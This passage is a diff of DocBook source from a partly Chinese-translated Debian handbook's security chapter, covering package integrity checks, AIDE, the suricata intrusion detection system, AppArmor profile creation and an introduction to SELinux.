+??5?????? c /etc/salt/roster</computeroutput>
+</screen>
+        <para>In the sample above, dpkg reports a change to SSH's service file
+        that the administrator made to the packaged file instead of using
+        an appropriate <filename>/etc/systemd/system/ssh.service</filename>
+        override (which would be stored below <filename>/etc</filename> like
+        any configuration change should be). It also lists multiple
+        configuration files (identified by the "c" letter on the second
+        field) that had been legitimately modified.</para>
+      </section>
+
+      <section id="sect.debsums">
+        <title>审核软件包：<command>debsums</command> 及其限制</title>
+        <indexterm><primary><command>debsums</command></primary></indexterm>
+
+        <para>
+          <command>debsums</command> is the ancestor of <command>dpkg -V</command>
+          and is thus mostly obsolete. It suffers from the same limitations than
+          dpkg. Fortunately, some of the limitations can be worked-around (whereas dpkg
+          does not offer similar work-arounds).
+        </para>
+
+        <para>
+          Since the data on the disk cannot be trusted, <command>debsums</command>
+          offers to do its checks based on <filename>.deb</filename> files instead of
+          relying on dpkg's database. To download trusted <filename>.deb</filename> files
+          of all the packages installed, we can rely on APT's authenticated downloads.
+	  This operation can be slow and tedious, and should therefore not be
+	  considered a proactive technique to be used on a regular
+          basis.
+        </para>
+
+        <screen>
+<computeroutput># </computeroutput><userinput>apt-get --reinstall -d install `grep-status -e 'Status: install ok installed' -n -s Package`</userinput>
+<computeroutput>[ ... ]
+# </computeroutput><userinput>debsums -p /var/cache/apt/archives --generate=all</userinput>
+</screen>
+
+	<para>注意本例使用 <emphasis role="pkg">dctrl-tools</emphasis> 软件包中的 <command>grep-status</command> 命令，该命令默认情况下没有安装。</para>
+      </section>
+      <section>
+        <title>监视文件：AIDE</title>
+        <indexterm><primary><emphasis role="pkg">aide</emphasis> （Debian 软件包）</primary></indexterm>
+
+	<para>AIDE（<emphasis>Advanced Intrusion Detection Environment</emphasis> ）工具可以检查文件完整性，侦测系统之前文件镜像的任何变化。这种影响以数据库（<filename>/var/lib/aide/aide.db</filename>）形式储存，包含了系统上所有文件的相关信息（指纹，权限，时间戳，等等）。该数据库使用 <command>aideinit</command>命令初始化；然后每天（通过 <filename>/etc/cron.daily/aide</filename> 脚本）检查有无任何相关改变。如果探测到变化，AIDE 会将其记入文件（<filename>/var/log/aide/*.log</filename>）并将发现通过邮件发送给管理员。</para>
+
+        <sidebar>
+          <title><emphasis>实践</emphasis> 保护数据库</title>
+
+	  <para>由于 AIDE 使用本地数据库来比较文件的状态，因此结果的有效性和数据库的有效性直接相关。如果攻击者获得超级用户权限，他就能替换数据库并覆盖其痕迹。一个可能的替代方案就是将参考数据储存在只读媒介上。</para>
+        </sidebar>
+
+	<para><filename>/etc/default/aide</filename> 中的很多选项可以用于调整 <emphasis role="pkg">aide</emphasis> 软件包行为。AIDE 配置存储在 <filename>/etc/aide/aide.conf</filename> 和 <filename>/etc/aide/aide.conf.d/</filename>（实际上，这些文件只用于 <command>update-aide.conf</command> 生成 <filename>/var/lib/aide/aide.conf.autogenerated</filename>）。配置指明哪些文件的哪些特性需要检查。譬如，日志文件的内容会有常规更新，只要这些文件的读写权限保持不变，那么就可以忽略这些变化。但是，可执行程序的内容和权限必须是不变的。虽然不是很复杂，但是配置的语法不是很直观，推荐阅读 <citerefentry><refentrytitle>aide.conf</refentrytitle> <manvolnum>5</manvolnum></citerefentry> 手册。</para>
+
+	<para>新版本的数据库每天生成在 <filename>/var/lib/aide/aide.db.new</filename>；如果所有记录的变化都是合法的，就可以用它替代参考数据库。</para>
+
+        <sidebar>
+          <title><emphasis>选择</emphasis> Tripwire 和 Samhain</title>
+
+	  <para>Tripwire 和 AIDE 非常相似；甚至是配置文件的语法都几乎相同。<emphasis role="pkg">tripwire</emphasis> 所提供的额外特性是签名配置文件机制，这样攻击者就不能将其指向不同版本的参考数据库。</para>
+
+	  <para>Samhain also offers similar features, as well as some
+	  functions to help detecting rootkits (see the sidebar
+	  <xref linkend="sidebar.the-checksecurity-and-chkrootkit-rkhunter-packages" />).
+	  It can also be deployed globally on a network, and
+	  record its traces on a central server (with a signature).</para>
+        </sidebar>
+
+        <sidebar id="sidebar.the-checksecurity-and-chkrootkit-rkhunter-packages">
+          <title><emphasis>速览</emphasis> <emphasis role="pkg">checksecurity</emphasis> 和 <emphasis role="pkg">chkrootkit</emphasis>/<emphasis role="pkg">rkhunter</emphasis> 软件包</title>
+          <indexterm><primary><emphasis role="pkg">checksecurity</emphasis></primary></indexterm>
+
+	  <para>三个软件包中，第一个包含了几个小脚本进行系统上的基础检查（空白口令，新的设置身份文件，等等）并警告管理员。尽管其名为“安全检查”，但是管理员不应该仅仅指望它来确保 Linux 系统安全。</para>
+
+	  <para><emphasis role="pkg">chkrootkit</emphasis> 和 <emphasis role="pkg">rkhunter</emphasis> 软件包可以搜索系统上安装的潜在 <emphasis>恶意软件（rootkits）</emphasis>。提示，此类软件被设计成掩盖系统已经被攻破，并谨慎的控制机器。检测并不能保证100%可靠，但是他们可以将管理员的注意力吸引到潜在问题上。</para>
+        </sidebar>
+      </section>
+    </section>
+    <section id="sect.intrusion-detection">
+      <title>侦测入侵（IDS/NIDS）</title>
+      <indexterm><primary>侦测，入侵</primary></indexterm>
+      <indexterm><primary>入侵侦测</primary></indexterm>
+      <indexterm><primary>IDS</primary></indexterm>
+      <indexterm><primary>入侵探测系统</primary></indexterm>
+      <indexterm><primary>NIDS</primary></indexterm>
+      <indexterm><primary>网络</primary><secondary>IDS</secondary></indexterm>
+
+      <sidebar>
+        <title><emphasis>回到基础</emphasis> 拒绝服务</title>
+        <indexterm><primary>拒绝服务</primary></indexterm>
+
+	<para>“拒绝服务”攻击只有一个目的：让服务不可用。不管是通过查询使服务器过载还是利用缺陷，最终目的都是一样的：服务不再运行。正常用户就会不悦，提供网络服务的实体声誉遭受损失（可能是营收，譬如，使用服务的是一个电子商务网站）。</para>
+
+	<para>Such an attack is sometimes “distributed”; this usually
+	involves overloading the server with large numbers of queries
+	coming from many different sources so that the server becomes
+	unable to answer the legitimate queries. These types of attacks
+	have gained well-known acronyms: <acronym>DDoS</acronym> and
+	<acronym>DoS</acronym> (depending on whether the denial of service
+	attack is distributed or not).</para>
+      </sidebar>
+
+      <para><command>suricata</command> (in the Debian package of the same
+      name) is a NIDS — a <emphasis>Network Intrusion Detection
+      System</emphasis>. Its function is to listen to the network and try
+      to detect infiltration attempts and/or hostile acts (including denial
+      of service attacks). All these events are logged in multiple files
+      in <filename>/var/log/suricata</filename>. There are third party tools
+      (Kibana/logstash) to better browse all the data collected.
+      <ulink type="block" url="http://suricata-ids.org" />
+      <ulink type="block" url="https://www.elastic.co/products/kibana" />
+      </para>
+      <indexterm><primary><command>snort</command></primary></indexterm>
+      <indexterm><primary><command>suricata</command></primary></indexterm>
+
+      <sidebar>
+        <title><emphasis>注意</emphasis> 行动范围</title>
+
+	<para>The effectiveness of <command>suricata</command> is limited by
+	the traffic seen on the monitored network interface. It will
+	obviously not be able to detect anything if it cannot observe the
+	real traffic. When plugged into a network switch, it will therefore
+	only monitor attacks targeting the machine it runs on, which is
+	probably not the intention. The machine hosting
+	<command>suricata</command> should therefore be plugged into the
+	“mirror” port of the switch, which is usually dedicated to
+	chaining switches and therefore gets all the traffic.</para>
+      </sidebar>
+
+      <para>
+        Configuring suricata involves reviewing and editing
+        <filename>/etc/suricata/suricata-debian.yaml</filename>, which is
+        very long because each parameter is abundantly commented.
+        A minimal configuration requires describing the range of addresses
+        that the local network covers (<literal>HOME_NET</literal>
+        parameter). In practice, this means the set of all potential
+        attack targets. But getting the most of it requires reading it in
+        full and adapting it to the local situation.
+      </para>
+      <para>
+        On top of this, you should also edit
+        <filename>/etc/default/suricata</filename> to define the network
+        interface to monitor and to enable the init script (by setting
+        <literal>RUN=yes</literal>). You might also want to set
+        <literal>LISTENMODE=pcap</literal> because the default
+        <literal>LISTENMODE=nfqueue</literal> requires further configuration
+        to work properly (the netfilter firewall must be configured to
+        pass packets to some user-space queue handled by suricata via the
+        <literal>NFQUEUE</literal> target).
+      </para>
+      <para>
+        To detect bad behaviour, <command>suricata</command> needs a set of
+        monitoring rules: you can find such rules in the
+        <emphasis role="pkg">snort-rules-default</emphasis> package.
+        <command>snort</command> is the historical reference in the IDS
+        ecosystem and <command>suricata</command> is able to reuse rules
+        written for it.  Unfortunately that package is missing from
+        <emphasis role="distribution">Debian Jessie</emphasis> and should
+        be retrieved from another Debian release like <emphasis role="distribution">Testing</emphasis> or <emphasis role="distribution">Unstable</emphasis>.
+      </para>
+      <para>
+        Alternatively, <command>oinkmaster</command> (in the package of the same name)
+        can be used to download Snort rulesets from external sources.
+      </para>
+      <sidebar>
+        <title><emphasis>进阶</emphasis> 与 <command>prelude</command> 集成</title>
+
+	<para>Prelude 将各种安全信息集中化。它的模块结构包含了服务器（<emphasis role="pkg">prelude-manager</emphasis> 中的<emphasis>管理器</emphasis>）收集由各种类型的 <emphasis>传感器（sensors）</emphasis> 产生的警报信息。</para>
+
+	<para>Suricata can be configured as such a sensor. Other possibilities
+	include <emphasis>prelude-lml</emphasis> (<emphasis>Log Monitor
+	Lackey</emphasis>) which monitors log files (in a manner similar to
+	<command>logcheck</command>, described in <xref linkend="sect.logcheck" />).</para>
+        <indexterm><primary><command>prelude</command></primary></indexterm>
+      </sidebar>
+    </section>
+  </section>
+  <section id="sect.apparmor">
+    <title>Introduction to AppArmor</title>
+    <indexterm><primary>AppArmor</primary></indexterm>
+    <section id="sect.apparmor-principles">
+      <title>原理</title>
+      <para>
+        AppArmor is a <emphasis>Mandatory Access Control</emphasis> (MAC)
+        system built on Linux's LSM (<emphasis>Linux Security
+          Modules</emphasis>) interface. In practice, the kernel queries
+        AppArmor before each system call to know whether the process is
+        authorized to do the given operation. Through this mechanism, AppArmor
+        confines programs to a limited set of resources.
+      </para>
+      <indexterm><primary><emphasis>Mandatory Access Control</emphasis></primary></indexterm>
+      <indexterm><primary><emphasis>Linux Security Modules</emphasis></primary></indexterm>
+      <para>
+        AppArmor applies a set of rules (known as “profile”) on each
+        program. The profile applied by the kernel depends on the
+        installation path of the program being executed.
+        Contrary to SELinux (discussed in <xref linkend="sect.selinux" />),
+        the rules applied do not depend on the user. All users 
+        face the same set of rules when they are executing the same
+        program (but traditional user permissions still apply and
+        might result in different behaviour!).
+      </para>
+      <para>
+        AppArmor profiles are stored in <filename>/etc/apparmor.d/</filename>
+        and they contain a list of access control rules on resources that
+        each program can make use of.
+        The profiles are compiled and loaded into the kernel by the
+        <command>apparmor_parser</command> command. Each profile can
+        be loaded either in enforcing or complaining mode. The former
+        enforces the policy and reports violation attempts, while the
+        latter does not enforce the policy but still logs the system
+        calls that would have been denied.
+      </para>
+    </section>
+    <section id="sect.apparmor-setup">
+      <title>Enabling AppArmor and managing AppArmor profiles</title>
+      <para>
+        AppArmor support is built into the standard kernels provided by Debian.
+        Enabling AppArmor is thus just a matter of installing a few
+        packages and adding some parameters to the kernel command line:
+      </para>
+      <screen><computeroutput># </computeroutput><userinput>apt install apparmor apparmor-profiles apparmor-utils
+</userinput><computeroutput>[...]
+# </computeroutput><userinput>perl -pi -e 's,GRUB_CMDLINE_LINUX="(.*)"$,GRUB_CMDLINE_LINUX="$1 apparmor=1 security=apparmor",' /etc/default/grub
+</userinput><computeroutput># </computeroutput><userinput>update-grub
+</userinput></screen>
+      <para>
+        After a reboot, AppArmor is now functional and <command>aa-status</command>
+        will confirm it quickly:
+      </para>
+      <screen>
+<computeroutput># </computeroutput><userinput>aa-status</userinput>
+<computeroutput>apparmor module is loaded.
+44 profiles are loaded.
+9 profiles are in enforce mode.
+   /usr/bin/lxc-start
+   /usr/lib/chromium-browser/chromium-browser//browser_java
+[...]
+35 profiles are in complain mode.
+   /sbin/klogd
+[...]
+3 processes have profiles defined.
+1 processes are in enforce mode.
+   /usr/sbin/libvirtd (1295) 
+2 processes are in complain mode.
+   /usr/sbin/avahi-daemon (941) 
+   /usr/sbin/avahi-daemon (1000) 
+0 processes are unconfined but have a profile defined.</computeroutput>
+</screen>
+      <sidebar>
+        <title><emphasis>NOTE</emphasis> More AppArmor profiles</title>
+        <para>
+          The <emphasis role="pkg">apparmor-profiles</emphasis> package
+          contains profiles managed by the upstream AppArmor community.
+          To get even more profiles you can install
+          <emphasis role="pkg">apparmor-profiles-extra</emphasis> which
+          contains profiles developed by Ubuntu and Debian.
+        </para>
+      </sidebar>
+      <para>
+        The state of each profile can be switched between
+        enforcing and complaining with calls to <command>aa-enforce</command>
+        and <command>aa-complain</command> giving as parameter either
+        the path of the executable or the path to the policy file.
+        Additionaly a profile can be entirely disabled with
+        <command>aa-disable</command> or put in audit mode (to log
+        accepted system calls too) with <command>aa-audit</command>.
+      </para>
+      <screen>
+<computeroutput># </computeroutput><userinput>aa-enforce /usr/sbin/avahi-daemon</userinput>
+<computeroutput>Setting /usr/sbin/avahi-daemon to enforce mode.</computeroutput>
+<computeroutput># </computeroutput><userinput>aa-complain /etc/apparmor.d/usr.bin.lxc-start</userinput>
+<computeroutput>Setting /etc/apparmor.d/usr.bin.lxc-start to complain mode.</computeroutput>
+      </screen>
+    </section>
+    <section id="sect.apparmor-new-profile">
+      <title>Creating a new profile</title>
+      <para>
+        Even though creating an AppArmor profile is rather easy, most
+        programs do not have one. This section will show you how to
+        create a new profile from scratch just by using the target
+        program and letting AppArmor monitor the system call it makes
+        and the resources it accesses.
+      </para>
+      <para>
+        The most important programs that need to be confined
+        are the network facing programs as those are the most likely
+        targets of remote attackers. That is why AppArmor conveniently
+        provides an <command>aa-unconfined</command> command to list
+        the programs which have no associated profile and which expose
+        an open network socket. With the <literal>--paranoid</literal>
+        option you get all unconfined processes that have at least one
+        active network connection.
+      </para>
+      <screen>
+<computeroutput># </computeroutput><userinput>aa-unconfined</userinput>
+<computeroutput>801 /sbin/dhclient not confined
+890 /sbin/rpcbind not confined
+899 /sbin/rpc.statd not confined
+929 /usr/sbin/sshd not confined
+941 /usr/sbin/avahi-daemon confined by '/usr/sbin/avahi-daemon (complain)'
+988 /usr/sbin/minissdpd not confined
+1276 /usr/sbin/exim4 not confined
+1485 /usr/lib/erlang/erts-6.2/bin/epmd not confined
+1751 /usr/lib/erlang/erts-6.2/bin/beam.smp not confined
+19592 /usr/lib/dleyna-renderer/dleyna-renderer-service not confined</computeroutput>
+      </screen>
+      <para>
+        In the following example, we will thus try to create a
+        profile for <command>/sbin/dhclient</command>. For this
+        we will use <command>aa-genprof dhclient</command>. It
+        will invite you to use the application in another window
+        and when done to come back to <command>aa-genprof</command>
+        to scan for AppArmor events in the system logs and
+        convert those logs into access rules. For each logged event,
+        it will make one or more rule suggestions that you can
+        either approve or further edit in multiple ways:
+      </para>
+      <screen>
+<computeroutput># </computeroutput><userinput>aa-genprof dhclient</userinput>
+<computeroutput>Writing updated profile for /sbin/dhclient.
+Setting /sbin/dhclient to complain mode.
+
+Before you begin, you may wish to check if a
+profile already exists for the application you
+wish to confine. See the following wiki page for
+more information:
+http://wiki.apparmor.net/index.php/Profiles
+
+Please start the application to be profiled in
+another window and exercise its functionality now.
+
+Once completed, select the "Scan" option below in 
+order to scan the system logs for AppArmor events. 
+
+For each AppArmor event, you will be given the 
+opportunity to choose whether the access should be 
+allowed or denied.
+
+Profiling: /sbin/dhclient
+
+[(S)can system log for AppArmor events] / (F)inish
+Reading log entries from /var/log/audit/audit.log.
+
+Profile:  /sbin/dhclient <co id="aa-genprof-execute"></co>
+Execute:  /usr/lib/NetworkManager/nm-dhcp-helper
+Severity: unknown
+
+(I)nherit / (C)hild / (P)rofile / (N)amed / (U)nconfined / (X) ix On / (D)eny / Abo(r)t / (F)inish
+<userinput>P</userinput>
+Should AppArmor sanitise the environment when
+switching profiles?
+
+Sanitising environment is more secure,
+but some applications depend on the presence
+of LD_PRELOAD or LD_LIBRARY_PATH.
+
+(Y)es / [(N)o]
+<userinput>Y</userinput>
+Writing updated profile for /usr/lib/NetworkManager/nm-dhcp-helper.
+Complain-mode changes:
+WARN: unknown capability: CAP_net_raw
+
+Profile:    /sbin/dhclient <co id="aa-genprof-capability"></co>
+Capability: net_raw
+Severity:   unknown
+
+[(A)llow] / (D)eny / (I)gnore / Audi(t) / Abo(r)t / (F)inish
+<userinput>A</userinput>
+Adding capability net_raw to profile.
+
+Profile:  /sbin/dhclient <co id="aa-genprof-read"></co>
+Path:     /etc/nsswitch.conf
+Mode:     r
+Severity: unknown
+
+  1 - #include &lt;abstractions/apache2-common&gt; 
+  2 - #include &lt;abstractions/libvirt-qemu&gt; 
+  3 - #include &lt;abstractions/nameservice&gt; 
+  4 - #include &lt;abstractions/totem&gt; 
+ [5 - /etc/nsswitch.conf]
+[(A)llow] / (D)eny / (I)gnore / (G)lob / Glob with (E)xtension / (N)ew / Abo(r)t / (F)inish / (M)ore
+<userinput>3</userinput>
+
+Profile:  /sbin/dhclient
+Path:     /etc/nsswitch.conf
+Mode:     r
+Severity: unknown
+
+  1 - #include &lt;abstractions/apache2-common&gt; 
+  2 - #include &lt;abstractions/libvirt-qemu&gt; 
+ [3 - #include &lt;abstractions/nameservice&gt;]
+  4 - #include &lt;abstractions/totem&gt; 
+  5 - /etc/nsswitch.conf 
+[(A)llow] / (D)eny / (I)gnore / (G)lob / Glob with (E)xtension / (N)ew / Abo(r)t / (F)inish / (M)ore
+<userinput>A</userinput>
+Adding #include &lt;abstractions/nameservice&gt; to profile.
+
+Profile:  /sbin/dhclient
+Path:     /proc/7252/net/dev
+Mode:     r
+Severity: 6
+
+  1 - /proc/7252/net/dev 
+ [2 - /proc/*/net/dev]
+[(A)llow] / (D)eny / (I)gnore / (G)lob / Glob with (E)xtension / (N)ew / Abo(r)t / (F)inish / (M)ore
+<userinput>A</userinput>
+Adding /proc/*/net/dev r to profile
+
+[...]
+Profile:  /sbin/dhclient <co id="aa-genprof-write"></co>
+Path:     /run/dhclient-eth0.pid
+Mode:     w
+Severity: unknown
+
+ [1 - /run/dhclient-eth0.pid]
+[(A)llow] / (D)eny / (I)gnore / (G)lob / Glob with (E)xtension / (N)ew / Abo(r)t / (F)inish / (M)ore
+<userinput>N</userinput>
+
+Enter new path: /run/dhclient*.pid
+
+Profile:  /sbin/dhclient
+Path:     /run/dhclient-eth0.pid
+Mode:     w
+Severity: unknown
+
+  1 - /run/dhclient-eth0.pid 
+ [2 - /run/dhclient*.pid]
+[(A)llow] / (D)eny / (I)gnore / (G)lob / Glob with (E)xtension / (N)ew / Abo(r)t / (F)inish / (M)ore
+<userinput>A</userinput>
+Adding /run/dhclient*.pid w to profile
+
+[...]
+Profile:  /usr/lib/NetworkManager/nm-dhcp-helper <co id="aa-genprof-other-profile"></co>
+Path:     /proc/filesystems
+Mode:     r
+Severity: 6
+
+ [1 - /proc/filesystems]
+[(A)llow] / (D)eny / (I)gnore / (G)lob / Glob with (E)xtension / (N)ew / Abo(r)t / (F)inish / (M)ore
+<userinput>A</userinput>
+Adding /proc/filesystems r to profile
+
+= Changed Local Profiles =
+
+The following local profiles were changed. Would you like to save them?
+
+ [1 - /sbin/dhclient]
+  2 - /usr/lib/NetworkManager/nm-dhcp-helper 
+(S)ave Changes / Save Selec(t)ed Profile / [(V)iew Changes] / View Changes b/w (C)lean profiles / Abo(r)t
+<userinput>S</userinput>
+Writing updated profile for /sbin/dhclient.
+Writing updated profile for /usr/lib/NetworkManager/nm-dhcp-helper.
+
+Profiling: /sbin/dhclient
+
+[(S)can system log for AppArmor events] / (F)inish
+<userinput>F</userinput>
+Setting /sbin/dhclient to enforce mode.
+Setting /usr/lib/NetworkManager/nm-dhcp-helper to enforce mode.
+
+Reloaded AppArmor profiles in enforce mode.
+
+Please consider contributing your new profile!
+See the following wiki page for more information:
+http://wiki.apparmor.net/index.php/Profiles
+
+Finished generating profile for /sbin/dhclient.</computeroutput>
+</screen>
+      <para>
+        Note that the program does not display back the control
+        characters that you type but for the clarity of the explanation I
+        have included them in the previous transcript.
+      </para>
+      <calloutlist>
+        <callout arearefs="aa-genprof-execute">
+          <para>
+            The first event detected is the execution of another program.
+            In that case, you have multiple choices: you can run the program
+            with the profile of the parent process (the “Inherit” choice),
+            you can run it with its own dedicated profile (the
+            “Profile” and the “Named” choices, differing only by the
+            possibility to use an arbitrary profile name), you can run it
+            with a sub-profile of the parent process (the “Child” choice),
+            you can run it without any profile (the “Unconfined” choice)
+            or you can decide to not run it at all (the “Deny” choice).
+          </para>
+          <para>
+            Note that when you opt to run it under a dedicated profile
+            that doesn't exist yet, the tool will create the missing profile
+            for you and will make rule suggestions for that profile in the
+            same run.
+          </para>
+        </callout>
+        <callout arearefs="aa-genprof-capability">
+          <para>
+            At the kernel level, the special powers of the root user have been split
+            in “capabilities”. When a system call requires a specific capability,
+            AppArmor will verify whether the profile allows the program to make
+            use of this capability.
+          </para>
+        </callout>
+        <callout arearefs="aa-genprof-read">
+          <para>
+            Here the program seeks read permissions for
+            <filename>/etc/nsswitch.conf</filename>. <command>aa-genprof</command>
+            detected that this permission was also granted by multiple
+            “abstractions” and offers them as alternative choices. An
+            abstraction provides a reusable set of access rules grouping
+            together multiple resources that are commonly used together.
+            In this specific case, the file is generally accessed through
+            the nameservice related functions of the C library and we type
+            “3” to first select the “#include
+            &lt;abstractions/nameservice&gt;” choice and then “A” to allow
+            it.
+          </para>
+        </callout>
+        <callout arearefs="aa-genprof-write">
+          <para>
+            The program wants to create the <filename>/run/dhclient-eth0.pid</filename>
+            file. If we allow the creation of this specific file only, the program
+            will not work when the user will use it on another network interface.
+            Thus we select “New” to replace the filename with the more generic
+            “/run/dhclient*.pid” before recording the rule with “Allow”.
+          </para>
+        </callout>
+        <callout arearefs="aa-genprof-other-profile">
+          <para>
+            Notice that this access request is not part of the dhclient
+            profile but of the new profile that we created when we allowed
+            <filename>/usr/lib/NetworkManager/nm-dhcp-helper</filename> to
+            run with its own profile.
+          </para>
+          <para>
+            After having gone through all the logged events, the program
+            offers to save all the profiles that were created during the
+            run. In this case, we have two profiles that we save at once
+            with “Save” (but you can save them individually too) before
+            leaving the program with “Finish”.
+          </para>
+        </callout>
+      </calloutlist>
+      <para>
+        <command>aa-genprof</command> is in fact only a smart wrapper
+        around <command>aa-logprof</command>: it creates an empty profile,
+        loads it in complain mode and then run
+        <command>aa-logprof</command> which is a tool to update a profile
+        based on the profile violations that have been logged. So you can
+        re-run that tool later to improve the profile that you just
+        created.
+      </para>
+      <para>
+        If you want the generated profile to be complete, you should use the
+        program in all the ways that it is legitimately used. In the case
+        of dhclient, it means running it via Network Manager, running it via
+        ifupdown, running it manually, etc. In the end, you might get
+        a <filename>/etc/apparmor.d/sbin.dhclient</filename> close to this:
+      </para>
+      <programlisting>
+# Last Modified: Tue Sep  8 21:40:02 2015
+#include &lt;tunables/global&gt;
+
+/sbin/dhclient {
+  #include &lt;abstractions/base&gt;
+  #include &lt;abstractions/nameservice&gt;
+
+  capability net_bind_service,
+  capability net_raw,
+
+  /bin/dash r,
+  /etc/dhcp/* r,
+  /etc/dhcp/dhclient-enter-hooks.d/* r,
+  /etc/dhcp/dhclient-exit-hooks.d/* r,
+  /etc/resolv.conf.* w,
+  /etc/samba/dhcp.conf.* w,
+  /proc/*/net/dev r,
+  /proc/filesystems r,
+  /run/dhclient*.pid w,
+  /sbin/dhclient mr,
+  /sbin/dhclient-script rCx,
+  /usr/lib/NetworkManager/nm-dhcp-helper Px,
+  /var/lib/NetworkManager/* r,
+  /var/lib/NetworkManager/*.lease rw,
+  /var/lib/dhcp/*.leases rw,
+
+  profile /sbin/dhclient-script flags=(complain) {
+    #include &lt;abstractions/base&gt;
+    #include &lt;abstractions/bash&gt;
+
+    /bin/dash rix,
+    /etc/dhcp/dhclient-enter-hooks.d/* r,
+    /etc/dhcp/dhclient-exit-hooks.d/* r,
+    /sbin/dhclient-script r,
+
+  }
+}
+      </programlisting>
+    </section>
+  </section>
+
+  <section id="sect.selinux">
+    <title>SELinux 简介</title>
+    <indexterm><primary>SELinux</primary></indexterm>
+    <section id="sect.selinux-principles">
+      <title>原理</title>
+
+      <para>SELinux （<emphasis>安全增强－Security Enhanced Linux</emphasis>）是一种基于Linux LSM（<emphasis>Linux 安全模块</emphasis>）的<emphasis>强制访问控制</emphasis>系统。实际上，内核在执行系统调用前会询问 SELinux 进程是否获得了执行操作的授权。</para>
+
+      <para>SELinux 使用一套规则－合称为<emphasis>策略</emphasis>－来授权或禁止操作。这些规则较难创建。幸好，有两种标准策略（<emphasis>针对－targeted</emphasis> 和 <emphasis>严格－strict</emphasis>）可以避免大量的配置工作。</para>
+
+      <para>在 SELinux 中，权限的管理完全不同于传统的 Unix 系统。进程的权限取决于它的<emphasis>安全上下文</emphasis>。上下文由唤起该进程的用户<emphasis>身份</emphasis>定义，即该时刻用户具有的<emphasis>角色</emphasis>和<emphasis>域</emphasis>。权限实际上取决于域，但是在域之间转换由角色控制。角色之间的转换取决于身份。</para>
+
+      <figure>
+        <title>安全上下文和 Unix 用户</title>
+        <mediaobject>
+          <imageobject>
+            <imagedata fileref="images/selinux-context.png" scalefit="1" width="65%" />
+          </imageobject>
+        </mediaobject>
+      </figure>
+
+      <para>实际上，在登录期间，用户被赋予默认的安全上下文（取决于它们的角色）。这定义了当前域，以及所有新的子进程的域。如果想要改变当前角色和相关联的域，就必须调用 <command>newrole -r <replaceable>role_r</replaceable> -t <replaceable>domain_t</replaceable></command>（一个指定角色通常只能被赋予一个域，<literal>-t</literal> 参数可以忽略）。该命令需要口令授权。这个特性可以禁止程序自动切换角色。在 SELinux 策略中，这种改变只能是显式的。</para>
+
+      <para>Obviously the rights do not apply to all
+      <emphasis>objects</emphasis> (files, directories, sockets, devices,
+      etc.). They can vary from object to object. To achieve this, each
+      object is associated to a <emphasis>type</emphasis> (this is known as
+      labeling). Domains' rights are thus expressed with sets of
+      (dis)allowed operations on those types (and, indirectly, on all
+      objects which are labeled with the given type).</para>
+
+      <sidebar>
+        <title><emphasis>补充</emphasis>域和类型等效</title>
+
+	<para>Internally, a domain is just a type, but a type that only
+	applies to processes. That's why domains are suffixed with
+	<literal>_t</literal> just like objects' types.</para>
+      </sidebar>
+
+      <para>By default, a program inherits its domain from the user who
+      started it, but the standard SELinux policies expect many important
+      programs to run in dedicated domains. To achieve this, those
+      executables are labeled with a dedicated type (for example
+      <command>ssh</command> is labeled with
+      <literal>ssh_exec_t</literal>, and when the program starts, it
+      automatically switches to the <literal>ssh_t</literal> domain). This
+      automatic domain transition mechanism makes it possible to grant only
+      the rights required by each program. It is a fundamental principle of
+      SELinux.</para>
+
+      <figure>
+        <title>域之间的自动转换</title>
+        <mediaobject>
+          <imageobject>
+            <imagedata fileref="images/selinux-transitions.png" scalefit="1" width="35%" />
+          </imageobject>
+        </mediaobject>
+      </figure>
+
+      <sidebar>
+        <title><emphasis>实践</emphasis>找到安全上下文</title>
+        <indexterm><primary>安全上下文</primary></indexterm>
+        <indexterm><primary>上下文，安全上下文</primary></indexterm>
+        <indexterm><primary>MCS（<emphasis>多类别安全－Multi-Category Security</emphasis>）</primary></indexterm>
+
+	<para>要找到指定进程的安全上下文，就要在 <command>ps</command> 命令中使用 <literal>Z</literal> 选项。</para>
+
+        <screen><computeroutput>$ </computeroutput><userinput>ps axZ | grep vstfpd</userinput>
+<computeroutput>system_u:system_r:ftpd_t:s0   2094 ?    Ss  0:00 /usr/sbin/vsftpd</computeroutput></screen>
+
+	<para>第一个区段包含了身份，角色，域和 MCS 等级，使用冒号分隔。MCS 等级（<emphasis>多类别安全－Multi-Category Security</emphasis>）是一个参数，它会影响保护策略的机密性，进而基于敏感性管制对文件的访问。本书中，此特性将不做详细解释。</para>
+
+	<para>要在命令行中显示当前的安全上下文，应当调用 <command>id -Z</command>。</para>
+
+        <screen><computeroutput>$ </computeroutput><userinput>id -Z</userinput>
+<computeroutput>unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023</computeroutput></screen>
+
+	<para>要显示赋予文件的类型，使用 <command>ls -Z</command>。</para>
+
+        <screen><computeroutput>$ </computeroutput><userinput>ls -Z test /usr/bin/ssh</userinput>
+<computeroutput>unconfined_u:object_r:user_home_t:s0 test
+     system_u:object_r:ssh_exec_t:s0 /usr/bin/ssh</computeroutput></screen>
+
+	<para>注意要将身份和角色赋予不是特别重要的文件（从未使用过），但是为了统一，所有的对象都被赋予完整的安全上下文。</para>
+      </sidebar>
+    </section>
+    <section id="sect.selinux-setup">
+      <title>设置 SELinux</title>
+
+      <para>SELinux 支持嵌入到 Debian 提供的标准内核中。Unix 核心工具无需修改就支持 SELinux。因此，启用 SELinux 也相对容易。</para>
+
+      <para>The <command>apt install selinux-basics
+      selinux-policy-default</command> command will automatically install
+      the packages required to configure an SELinux system.</para>
+
+      <sidebar>
+        <title><emphasis>CAUTION</emphasis> Reference policy not in jessie</title>
+        <para>
+          Unfortunately the maintainers of the <emphasis role="pkg">refpolicy</emphasis> source package did not handle
+          release critical bugs on their package and the package got
+          removed from jessie. This means that the <emphasis role="pkg">selinux-policy-*</emphasis> packages are currently not
+          installable in jessie and need to be fetched from another
+          place. Hopefully they will come back in one of the point releases
+          or in jessie-backports. In the meantime, you can grab them
+          from unstable.
+        </para>
+        <para>
+          This sad situation at least proves that SELinux is not very popular
+          in the set of users/developers who are running the development
+          versions of Debian. Thus, if you opt to use SELinux, you
+          should expect the default policy to not work perfectly and
+          you will have to invest quite some time to make it suitable
+          to your specific needs.
+        </para>
+      </sidebar>
+
+      <para>The <emphasis role="pkg">selinux-policy-default</emphasis>
+      package contains a set of standard rules. By default, this policy
+      only restricts access for a few widely exposed services. The user
+      sessions are not restricted and it is thus unlikely that SELinux
+      would block legitimate user operations. However, this does enhance
+      the security of system services running on the machine. To setup a
+      policy equivalent to the old “strict” rules, you just have to
+      disable the <literal>unconfined</literal> module (modules management
+      is detailed further in this section).</para>
+
